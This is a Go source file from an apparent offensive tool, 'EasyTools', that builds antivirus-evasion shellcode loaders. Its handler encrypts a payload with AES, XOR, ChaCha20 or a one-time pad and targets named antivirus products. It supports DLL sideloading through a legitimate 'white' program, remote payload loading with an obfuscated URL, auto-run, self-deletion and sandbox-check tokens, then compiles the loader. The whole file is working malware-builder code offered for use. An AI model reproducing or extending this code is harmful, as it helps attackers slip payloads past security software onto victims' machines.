package bypassAv

import (
	"EasyTools/app/bypass/shell/encode"
	"EasyTools/app/bypass/shell/util"
	"EasyTools/app/bypass/skyshadow"
	"EasyTools/app/controller/system"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

type MakeRequestData struct {
	Mode                   string                 `json:"mode"`
	EncodeWay              string                 `json:"encodeWay"`
	Av                     string                 `json:"av"`
	BuildWay               string                 `json:"buildWay"`
	Arch                   string                 `json:"arch"`
	TargetOS               string                 `json:"targetOS"`
	SkyShadowArch          string                 `json:"skyShadowArch"`
	LoadWay                string                 `json:"loadWay"`
	PassBoxWay             string                 `json:"passBoxWay"`
	PassBoxToken           string                 `json:"passBoxToken"` // 命令行运行模式的自定义运行口令（前端输入）
	AutoRun                string                 `json:"autoRun"`
	AutoDelete             string                 `json:"AutoDelete"`
	AutoDeleteTime         string                 `json:"AutoDeleteTime"`
	YuanchengUrlOrFileName string                 `json:"yuanchengUrlOrFileName"`
	SkyShadowPayload       *skyshadow.PayloadMeta `json:"skyShadowPayload"` // SkyShadow白程序信息
	KeepConsole            bool                   `json:"keepConsole"`      // 保留控制台（命令行工具模式，如 mimikatz）
}

func RunMakeFile(c *gin.Context) {
	if _, err := os.Stat(filepath.Join(os.TempDir(), "EasyTools", "file", "go.mod")); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "请先点击shellcode处理",
		})
		return
	}

	var requestData MakeRequestData
	// 解析 JSON 请求体
	if err := c.ShouldBindJSON(&requestData); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "Invalid JSON format: " + err.Error(),
		})
		return
	}

	// 设置默认值（如果字段未提供）
	if requestData.Mode == "" {
		mode, ok := util.DefaultWindowsLoader()
		if !ok {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   "当前版本没有可用的运行模式模板，请更新软件",
			})
			return
		}
		requestData.Mode = mode
	}
	if requestData.EncodeWay == "" {
		requestData.EncodeWay = "xor"
	}
	if requestData.Av == "" {
		requestData.Av = "360"
	}
	if requestData.BuildWay == "" {
		requestData.BuildWay = "go"
	}

	if requestData.Arch == "" {
		requestData.Arch = "x64"
	}

	if requestData.TargetOS == "" {
		requestData.TargetOS = "windows"
	}
	requestData.TargetOS = util.NormalizeTargetOS(requestData.TargetOS)

	if requestData.LoadWay == "白加黑" && requestData.TargetOS != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "白加黑模式仅支持 Windows 目标平台",
		})
		return
	}

	if requestData.TargetOS != "windows" {
		// 非 Windows 目标必须使用 Unix 模板；模板集不含 Unix 模板时给出明确提示，
		// 而不是把 Mode 改写成不存在的模板名，最后抛出莫名其妙的"模板不存在"。
		unixLoader, ok := util.DefaultUnixLoader()
		if !ok {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   "当前版本不包含 Linux/macOS 目标模板，请将目标平台选择为 Windows",
			})
			return
		}
		requestData.Mode = unixLoader
	}

	// 运行模式必须是真实存在的模板：提前校验，避免编译阶段才报错（错误还指向无关原因）
	if !util.HasLoaderTemplate(requestData.Mode) {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   fmt.Sprintf("运行模式 %s 不是有效模板，请在界面上重新选择运行模式", requestData.Mode),
		})
		return
	}

	if requestData.SkyShadowArch == "" {
		requestData.SkyShadowArch = "x64" // 默认使用 x64，不再支持自动检测
	}

	if requestData.LoadWay == "" {
		requestData.LoadWay = "一体"
	}

	if requestData.PassBoxWay == "" {
		requestData.PassBoxWay = "true"
	}

	// 命令行运行模式：使用前端用户输入的自定义运行口令（写入临时文件，生成时内联进载荷）。
	// 口令仅允许字母/数字/下划线/连字符，防止注入生成的 Go 源码字符串。
	if requestData.PassBoxWay == "命令行运行" {
		token := strings.TrimSpace(requestData.PassBoxToken)
		if token == "" {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   "命令行运行模式需要填写运行口令",
			})
			return
		}
		if len(token) < 4 || len(token) > 64 {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   "运行口令长度需在 4-64 个字符之间",
			})
			return
		}
		for _, r := range token {
			isLetter := (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z')
			isDigit := r >= '0' && r <= '9'
			if !isLetter && !isDigit && r != '_' && r != '-' {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   "运行口令仅允许字母、数字、下划线、连字符",
				})
				return
			}
		}
		if err := os.WriteFile(filepath.Join(os.TempDir(), "EasyTools", "file", "SandboxToken.txt"), []byte(token), 0644); err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{
				"success": false,
				"error":   fmt.Sprintf("保存运行口令失败: %v", err),
			})
			return
		}
	}

	if requestData.AutoRun == "" {
		requestData.AutoRun = "false"
	}

	if requestData.AutoDelete == "" {
		requestData.AutoDelete = "false"
	}

	// 自动删除配置取自本次请求参数
	userAutoDeleteEnabled := requestData.AutoDelete == "true"
	userAutoDeleteTime := requestData.AutoDeleteTime

	var localAutoDelete string = "false"
	var localAutoDeleteTime string = ""
	// yunAutoDelete / yunAutoDeleteTime 保留给 GenGoFile 的入参签名，默认关闭
	var yunAutoDelete string = "false"
	var yunAutoDeleteTime string = ""

	// 远程/分离模式不支持 OTP（无内联载荷拷贝，就地解码无意义），给出明确提示
	if requestData.EncodeWay == "otp" && (requestData.LoadWay == "远程" || requestData.LoadWay == "分离") {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "OTP 一次一密仅支持一体/白加黑模式（远程/分离请使用 aes/xor/chacha20）",
		})
		return
	}
	// OTP 就地解码依赖 Windows 模板的 RtlMoveMemory 拷贝序列，非 Windows 目标不支持
	if requestData.EncodeWay == "otp" && requestData.TargetOS != "windows" {
		c.JSON(http.StatusBadRequest, gin.H{
			"success": false,
			"error":   "OTP 一次一密目前仅支持 Windows 目标",
		})
		return
	}

	// 检查本地自动删除配置
	if userAutoDeleteEnabled {
		localAutoDelete = "true"
		localAutoDeleteTime = userAutoDeleteTime
	}

	// 只按本次请求参数决定自动删除
	if localAutoDelete == "true" {
		requestData.AutoDelete = "true"
		requestData.AutoDeleteTime = localAutoDeleteTime
	} else {
		requestData.AutoDelete = "false"
		requestData.AutoDeleteTime = ""
	}

	// 远程/分离模式：URL 或文件名使用随机 XOR 密钥混淆（不再使用固定 0x88），
	// 密钥写入临时目录供 GenGoFile 内联进生成的载荷
	if requestData.YuanchengUrlOrFileName != "" {
		urlXorKey := byte(0x88)
		if keyBytes, err := encode.GenerateXorKey(); err == nil {
			urlXorKey = keyBytes.Key1
		}
		requestData.YuanchengUrlOrFileName = encode.XorURLOrFileName(requestData.YuanchengUrlOrFileName, urlXorKey)
		_ = os.WriteFile(filepath.Join(os.TempDir(), "EasyTools", "file", "UrlXorKey.txt"), []byte{urlXorKey}, 0644)
	}

	if requestData.LoadWay == "白加黑" {
		// 如果提供了SkyShadow白程序信息，使用动态白程序
		if requestData.SkyShadowPayload != nil && requestData.SkyShadowPayload.Header != "" {
			// 路径安全：Header 只允许普通目录名，ExeName 只允许普通文件名，
			// 防止路径穿越导致任意文件读取/复制到任意位置
			header := sanitizeDirSegment(requestData.SkyShadowPayload.Header)
			if header == "" {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   "非法的白程序目录名",
				})
				return
			}
			exeName := sanitizeFileNameSegment(requestData.SkyShadowPayload.ExeName, ".exe")
			if exeName == "" {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   "非法的白程序文件名",
				})
				return
			}
			requestData.SkyShadowPayload.Header = header
			requestData.SkyShadowPayload.ExeName = exeName

			base := new(system.Base)
			baseDir := base.GetAppPath()
			payloadRoot := filepath.Join(baseDir, "file", "skyshadow", "Payload")
			payloadDir := filepath.Join(payloadRoot, header)

			// 检查白程序目录是否存在
			if _, err := os.Stat(payloadDir); os.IsNotExist(err) {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   fmt.Sprintf("白程序目录不存在: %s", payloadDir),
				})
				return
			}

			// 复制白程序到输出目录
			exePath := filepath.Join(payloadDir, requestData.SkyShadowPayload.ExeName)
			if _, err := os.Stat(exePath); os.IsNotExist(err) {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   fmt.Sprintf("白程序文件不存在: %s", exePath),
				})
				return
			}

			// 复制白程序到EasyToolsFiles/file目录
			outputDir := filepath.Join("EasyToolsFiles", "file")
			if err := os.MkdirAll(outputDir, 0755); err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   fmt.Sprintf("创建输出目录失败: %s", err),
				})
				return
			}

			destExePath := filepath.Join(outputDir, requestData.SkyShadowPayload.ExeName)
			if err := copyFile(exePath, destExePath); err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   fmt.Sprintf("复制白程序失败: %s", err),
				})
				return
			}
		} else {
			// 使用原有的固定白程序
			err := util.ExtractBaiJiaHeiFile(filepath.Join("EasyToolsFiles", "file"))
			if err != nil {
				c.JSON(http.StatusBadRequest, gin.H{
					"success": false,
					"error":   fmt.Sprintf("白文件复制失败: %s", err),
				})
				return
			}
		}
	}

	// 使用 goroutine 执行异步任务；错误通过 channel 回传，避免 goroutine 内直接写响应（数据竞争）
	errCh := make(chan error, 16)
	var wg sync.WaitGroup
	wg.Add(1)

	// 异步处理任务
	go func() {
		defer wg.Done() // 确保任务完成时通知主线程

		// 保存加密后的文件
		resultDir := filepath.Join(os.TempDir(), "EasyTools")
		isExit, _ := util.FileExists(resultDir)
		if !isExit {
			if err := os.Mkdir(resultDir, 0755); err != nil {
				errCh <- fmt.Errorf("创建目录失败: %s", err)
				return
			}
		}

		if requestData.LoadWay == "远程" {
			// 远程模式下，从临时目录读取 upload.go 保存的密钥
			XorKeyBytes, err := os.ReadFile(filepath.Join(os.TempDir(), "EasyTools", "file", "XorKey.txt"))
			if err != nil || len(XorKeyBytes) < 5 {
				// 如果读取失败，生成新密钥（兼容旧流程）
				XorKey, err := encode.GenerateXorKey()
				if err != nil {
					errCh <- fmt.Errorf("生成 XOR 密钥失败: %v", err)
					return
				}
				XorKeyBytes = encode.XorKeyToBytes(XorKey)
			}

			os.WriteFile(filepath.Join(resultDir, "file", "AesEncrypted.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "XorEncrypted.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "AesKey.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "XorKey.txt"), XorKeyBytes, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "UrlOrFileEncrypted.txt"), []byte(requestData.YuanchengUrlOrFileName), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Key.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Nonce.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Encrypted.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "OtpEncrypted.txt"), []byte(""), 0644)
		} else if requestData.LoadWay == "分离" {
			// 分离模式下，从临时目录读取 upload.go 保存的密钥
			XorKeyBytes, err := os.ReadFile(filepath.Join(os.TempDir(), "EasyTools", "file", "XorKey.txt"))
			if err != nil || len(XorKeyBytes) < 5 {
				// 如果读取失败，生成新密钥（兼容旧流程）
				XorKey, err := encode.GenerateXorKey()
				if err != nil {
					errCh <- fmt.Errorf("生成 XOR 密钥失败: %v", err)
					return
				}
				XorKeyBytes = encode.XorKeyToBytes(XorKey)
			}

			os.WriteFile(filepath.Join(resultDir, "file", "AesEncrypted.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "XorEncrypted.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "AesKey.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "XorKey.txt"), XorKeyBytes, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "UrlOrFileEncrypted.txt"), []byte(requestData.YuanchengUrlOrFileName), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Key.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Nonce.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Encrypted.txt"), []byte(""), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "OtpEncrypted.txt"), []byte(""), 0644)
		} else {
			// 检查 payload.bin 文件是否存在（写盘时为混淆态，读取时自动还原）
			payloadBinPath := filepath.Join(resultDir, "file", "payload.bin")
			if _, err := os.Stat(payloadBinPath); os.IsNotExist(err) {
				errCh <- fmt.Errorf("请先点击「处理bin文件/预处理」再生成")
				return
			}

			// 带重试读取载荷：安全软件实时监控会短暂占用刚落盘的文件，
			// 瞬时失败重试即可恢复，直接判失败会让用户看到无意义的"处理失败"。
			payload, err := encode.ReadPayloadAtRestRetry(payloadBinPath, 4, 400*time.Millisecond)
			if err != nil {
				errCh <- fmt.Errorf("读取载荷失败（%s）: %v；请重新点击「处理bin文件/预处理」后重试", payloadBinPath, err)
				return
			}
			if len(payload) == 0 {
				errCh <- fmt.Errorf("载荷为空，请重新点击「处理bin文件/预处理」")
				return
			}
			// 各编码函数均原地修改入参，必须各传一份独立副本
			// （历史 bug：共用同一份切片导致 OTP 编码到的是上一次的密文）。
			payloadBin := append([]byte(nil), payload...)
			payloadBin1 := append([]byte(nil), payload...)
			payloadBin2 := append([]byte(nil), payload...)
			payloadBin3 := append([]byte(nil), payload...)

			// 使用AES加密
			AesKey := encode.GenerateAesKey()
			AesEncryptShellcode, _ := encode.Aes_Encrypt(payloadBin, AesKey)

			// 使用 XOR 加密（生成随机密钥）
			XorKey, err := encode.GenerateXorKey()
			if err != nil {
				errCh <- fmt.Errorf("生成 XOR 密钥失败: %v", err)
				return
			}
			XorEncryptShellcode := encode.XorEncrypt(payloadBin1, XorKey)
			XorKeyBytes := encode.XorKeyToBytes(XorKey)

			// 使用 chacha20 加密
			ChaCha20Key, _ := encode.GenerateChaCha20Key()
			ChaCha20Nonce, _ := encode.GenerateChaCha20Nonce()
			ChaCha20EncryptShellcode, _ := encode.ChaCha20Encrypt(ChaCha20Key, ChaCha20Nonce, payloadBin2)

			// OTP 一次一密：生成 密文‖全长随机密钥 blob（2N），就地解码由 GenGoFile 注入
			OtpEncryptShellcode, otpErr := encode.OtpEncrypt(payloadBin3)
			if otpErr != nil {
				errCh <- fmt.Errorf("OTP 编码失败: %v", otpErr)
				return
			}

			os.WriteFile(filepath.Join(resultDir, "file", "AesEncrypted.txt"), AesEncryptShellcode, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "XorEncrypted.txt"), XorEncryptShellcode, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "AesKey.txt"), AesKey, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "XorKey.txt"), XorKeyBytes, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "UrlOrFileEncrypted.txt"), []byte(requestData.YuanchengUrlOrFileName), 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Key.txt"), ChaCha20Key, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Nonce.txt"), ChaCha20Nonce, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "ChaCha20Encrypted.txt"), ChaCha20EncryptShellcode, 0644)
			os.WriteFile(filepath.Join(resultDir, "file", "OtpEncrypted.txt"), OtpEncryptShellcode, 0644)
		}

		// 根据选择的Loader生成Go文件
		var goFilePathSlice []string
		AllLoader := []string{requestData.Mode}

		// 循环所有模板生成Go文件
		for _, l := range AllLoader {
			// 如果是白加黑模式且提供了SkyShadow白程序信息，获取选中的函数名和所有函数列表
			var selectedFunctionName string
			var allFunctions []string
			var selectedFunctions []string
			if requestData.LoadWay == "白加黑" && requestData.SkyShadowPayload != nil {
				// 兼容旧版本：单个函数选择
				selectedFunctionName = requestData.SkyShadowPayload.SelectedFunction

				// 新版本：多函数选择
				if len(requestData.SkyShadowPayload.SelectedFunctions) > 0 {
					selectedFunctions = requestData.SkyShadowPayload.SelectedFunctions
				} else if selectedFunctionName != "" {
					// 兼容旧版本：将单个函数转换为数组
					selectedFunctions = []string{selectedFunctionName}
				}

				// 收集所有函数（从所有DLL中）
				if requestData.SkyShadowPayload.Dlls != nil {
					for _, dll := range requestData.SkyShadowPayload.Dlls {
						if dll.Functions != nil {
							allFunctions = append(allFunctions, dll.Functions...)
						}
					}
				}

			}
			goFilePath, genErr := util.GenGoFile(l, requestData.LoadWay, requestData.EncodeWay, requestData.PassBoxWay, requestData.AutoRun, localAutoDelete, localAutoDeleteTime, yunAutoDelete, yunAutoDeleteTime, selectedFunctionName, allFunctions, selectedFunctions)
			if genErr != nil {
				errCh <- fmt.Errorf("生成模板 %s 失败: %v", l, genErr)
				return
			}
			if goFilePath == "" {
				errCh <- fmt.Errorf("生成模板 %s 失败，未生成源码文件", l)
				return
			}
			goFilePathSlice = append(goFilePathSlice, goFilePath)
		}

		// 编译所有Go文件
		for _, goFileName := range goFilePathSlice {
			binExt := util.BinaryExtension(requestData.TargetOS)
			exeFilePath := strings.TrimSuffix(goFileName, ".go") + binExt

			// 如果是白加黑模式且提供了SkyShadow白程序信息，需要动态生成DLL名称
			var dllName string
			var skyShadowPayloadHeader string
			if requestData.LoadWay == "白加黑" && requestData.SkyShadowPayload != nil && len(requestData.SkyShadowPayload.Dlls) > 0 {
				// 使用第一个DLL的名称（通常一个白程序对应一个DLL）
				dllName = sanitizeFileNameSegment(requestData.SkyShadowPayload.Dlls[0].Name, "")
				if dllName == "" {
					errCh <- fmt.Errorf("非法的 DLL 名称: %s", requestData.SkyShadowPayload.Dlls[0].Name)
					return
				}
				if !strings.HasSuffix(strings.ToLower(dllName), ".dll") {
					dllName = dllName + ".dll"
				}
				skyShadowPayloadHeader = sanitizeDirSegment(requestData.SkyShadowPayload.Header)
				if skyShadowPayloadHeader == "" {
					errCh <- fmt.Errorf("非法的白程序目录名: %s", requestData.SkyShadowPayload.Header)
					return
				}
			}

			// 选择传给编译器的架构参数：
			// - 白加黑模式时优先使用 SkyShadowArch（x64/x86）
			// - 其他模式使用通用 Arch
			archToUse := requestData.Arch
			if requestData.LoadWay == "白加黑" {
				// 白加黑模式下，如果提供了 SkyShadowArch 则使用它，否则使用通用 Arch
				if requestData.SkyShadowArch != "" {
					archToUse = requestData.SkyShadowArch
				}
			}

			if err := util.BuildLoaderFile(goFileName, exeFilePath, requestData.Av, requestData.BuildWay, requestData.LoadWay, dllName, skyShadowPayloadHeader, archToUse, requestData.TargetOS, requestData.KeepConsole); err != nil {
				// 透出编译器真实报错，否则 GUI 只看到"生成出错"，无从定位
				errCh <- fmt.Errorf("编译失败: %v", err)
				return
			}
		}
		// 删除处理过程文件
		util.DelDirPath(filepath.Join(resultDir))
	}()

	// 等待异步任务完成后再返回响应
	wg.Wait()
	close(errCh)

	// 收集错误：任一环节失败即返回失败，避免 goroutine 内直接写响应造成的数据竞争
	for err := range errCh {
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{
				"success": false,
				"error":   err.Error(),
			})
			return
		}
	}

	// 如果没有错误，返回成功
	c.JSON(http.StatusOK, gin.H{
		"message": "Processing completed successfully",
		"status":  "success",
	})
}

// copyFile 复制文件
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}
